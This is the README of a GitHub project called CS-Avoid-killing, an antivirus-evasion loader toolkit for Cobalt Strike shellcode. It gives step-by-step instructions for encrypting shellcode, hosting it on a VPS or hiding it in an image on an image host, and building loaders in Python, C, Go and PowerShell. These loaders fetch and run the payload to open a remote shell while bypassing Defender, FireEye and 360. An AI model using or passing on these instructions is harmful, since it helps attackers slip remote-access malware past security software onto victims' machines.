# CS-Avoid-killing
[Chinese README](https://github.com/Gality369/CS-Loader/blob/master/README_Chinese.md)

Overall, malware identification through the application's binary feature strings is still the most commonly used static analysis by antivirus software, while dynamic analysis (sandboxing, virtual machines, etc.) can be bypassed by anti-debugging, anti-sandboxing, and other techniques, so minimizing the binary features of a malicious program is still an important means of avoiding detection and killing.

CS evasion, including both Python and C versions (Tested: Python packaged version has bugs on Windows 10, not working, but works fine on Windows 7)

In addition to using a specific language to obfuscate binary features, it is also possible to implement a generic obfuscator to obfuscate arbitrary programs at the binary level. The generic obfuscator implemented in this project is an LLVM-17 based obfuscator that takes advantage of LLVM's new pass implementation plug-in feature to enable code obfuscation for multiple languages and platforms.

- V4.0: A general-purpose code obfuscator has been implemented, which can obfuscate the binary of any program with the help of LLVM, and is theoretically a general-purpose method to fight against antivirus static scanning. The Generic_obfuscator is a rewrite of obfuscator ref: https://github.com/obfuscator-llvm/obfuscator

- V3.1 Added Go version (can bypass FireEye/360/Defender).

- V3.0: Attempting to integrate more evasion techniques (planning to research process injection/file bundling to see how well they evade protection).

- V2.0: Developed an online evasion platform (Completed)

> PS: In practical use, I found that a graphical interface is not ideal for integration with other tools, while command-line interfaces are more flexible and extensible.
> 
> Regarding my online evasion platform, I don't plan to open-source it at this time because the technology is still in its early stages. If anyone is interested in trying it out, feel free to contact me.

- ~~V2.0: Develop a graphical user interface~~

- V1.7: Added PowerShell evasion (Completed)


- V1.5: Added C version of CS evasion (Completed)

- V1.0: Currently, it can bypass Defender/FireEye's static and dynamic protection. 360 hasn't been tested yet. I don't want to install the full 360 suite, but you can test it yourself.

## Dependencies

Generic Obfuscator:

- llvm-17：
```
git clone --depth 1 -b release/17.x https://github.com/llvm/llvm-project.git
mkdir build
cmake -G Ninja -DLLVM_ENABLE_PROJECTS="clang;lld" -DLLVM_TARGETS_TO_BUILD="X86;ARM;AArch64" -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF -DLLVM_ENABLE_RTTI=ON -DLLVM_OBFUSCATION_LINK_INTO_TOOLS=
ON -DCMAKE_INSTALL_PREFIX=./build/ ../llvm-project/llvm
ninja -j8
ninja install
```

Python:

- Python 2
- PyInstaller
- Requests

C: VS2019 should be sufficient

PowerShell: Tested on Windows 10 (PS 5.1), lower versions haven't been tested.

Go: Go

## Installation

Other versions are portable to use, just clone the project.
`git clone https://github.com/Gality369/CS-Avoid-killing.git`

Howerver, Generic_bfuscator need additionally installation：
```
cd Generic Obfuscator
mkdir build
cd build
cmake ..
make -j `nproc`
```

## Usage
1. First, generate a C-format shellcode through CS:
`Attacks -> Packages -> Payload Generator`
Choose a listener and generate a C shellcode (essentially binary code).

2. Python version:

   > 1. Paste the generated shellcode into the shellcode variable in generator.py and provide a Key for RC4 encryption.
   > 2. Run generator.py, the generated payload will be saved in payload.txt.
   > 3. Upload payload.txt to your VPS. The loader will fetch the encrypted shellcode from the VPS and decrypt it locally for execution.
   > 4. In PyLoader.py, fill in the path to the payload on your VPS and the Key you just set.
   > 5. Package the file using `python pyinstaller.py -F -w PyLoader.py`. The executable will be in the dist folder inside the pyshellcode directory. Double-click to run and the host will go online.

3. C version:

   > 1. Input your own Key, shellcode length, and shellcode as required, then execute.
   > 2. Copy the first line's number into the Base64ShellLen field in Loader, save the generated encrypted shellcode in payload.txt, and place it on the server. If the filename or path is different, modify the path in `char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";` accordingly.
   > 3. In path, fill in the path to access the payload (e.g., /test/payload.txt).
   > 4. Fill in your Key and VPS IP in Loader, then compile.
   > 5. Run the compiled .exe to bring up the CS shell.

4. PowerShell version:

   > 1. Generate a PowerShell payload .ps1 in CS.
   > 2. Run Python3 PSconfusion.py payload.ps1 AVpayload.ps1.
   > 3. This version can bypass all static detections from current antivirus software. For dynamic detections, some CS modules may trigger detection when loading, and that will be explored further later.

5. Go version:

   > 1. Place a not-too-large image in the same folder.
   > 2. Paste the generated shellcode into the shellcode variable in generator.py, and execute `python generator YourRC4key ImageName`. The shellcode will be appended to the end of the image.
   > 3. Upload the image to an image hosting service (choose one that does not compress images to ensure the shellcode remains intact).
  > 4. Enter the image URL and your RC4 key into the corresponding fields in CS-Loader.go.
   > 5. Build the .exe using the command `go build -ldflags="-H windowsgui" CS-Loader.go` (you can compress it with UPX).
   > 6. Run the .exe and the CS shell will be active.

6. Generic Obfuscator Version：
   
   > 1. set `config/config.json` to enable different functions. (Please check `Generic_obfuscator/README.md` to get more information.)
   > 2. run `<your-clang-17> -fpass-plugin=<your-generic_obfuscator.so>`

## Notes

1. PyInstaller Installation Details:

   > The last version of PyInstaller that supports Python 2 is 3.6 (newer versions no longer support Python 2).
   > 
   > Website: https://github.com/pyinstaller/pyinstaller/releases
   > 
   > You also need to install pywin32: https://github.com/mhammond/pywin32

2. Package in the target environment to avoid issues with different systems. Avoid using Python 3 for this project due to poor support for ctypes in Python 3, which can cause random bugs.
   Thanks to KingSF5 for fixing the Python 3 version (greatly appreciated~).

3. C version testing:
The C version works fine under X86Debug mode. In Release mode, there are unexplained bugs, and it may not work properly on some machines. Please test according to your needs.

4. Do not select dynamic compilation, as it may cause the program to fail to run due to missing DLLs on the target machine.

5. The method of loading PowerShell scripts is not discussed here, but some experts have already documented it well. Please search for it on Baidu.

6. Before building the Go version, it is recommended to run `set GOARCH=amd64` and use a 64-bit shellcode. A 32-bit build may lead to errors related to missing functions in ntdll.dll, as reported by others:
https://stackoverflow.com/questions/58649055/failed-to-find-rtlcopymemory-procedure-in-ntdll-dll-only-when-goarch-386

7. For a detailed description of Generic Obfuscator, please refer to `Generic_obfuscator/README.md`, which provides a detailed description of the obfuscator and how to use it.